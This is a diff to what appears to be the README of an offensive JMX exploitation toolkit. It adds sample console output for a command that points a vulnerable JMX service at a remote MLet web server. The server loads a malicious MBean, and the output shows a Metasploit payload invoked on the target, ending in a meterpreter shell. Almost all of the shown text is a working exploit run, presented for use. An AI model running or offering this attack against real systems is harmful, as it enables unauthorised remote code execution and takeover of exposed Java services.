@@ -37,6 +37,21 @@ msf > run
 Use mjet.jar to connect to the vulnerable JMX service and provide the URL to the MLet Web server...
 ```
 java -jar mjet.jar -t 192.168.178.200 -p 1616 -u http://192.168.178.1:8080/mlet/
+---------------------------------------------------
+MJET - Mogwai Security JMX Exploitation Toolkit 0.1
+---------------------------------------------------
+
+[+] Connecting to JMX URL: service:jmx:rmi:///jndi/rmi://192.168.178.200:1616/jmxrmi ...
+[+] Connected: rmi://192.168.178.164  5
+[+] Trying to create MLet bean...
+[+] Loaded javax.management.loading.MLet
+[+] Loading malicious MBean from http://192.168.178.1:8080/mlet/
+[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
+[+] Loaded class: metasploit.Metasploit
+[+] Loaded MBean Server ID: ptIIirfM:name=BlPwaoHu,id=oWTqfkbE
+[+] Invoking: metasploit.Metasploit.run()
+[+] Done
+
 ```
 
 and enjoy your meterpreter shell :-)
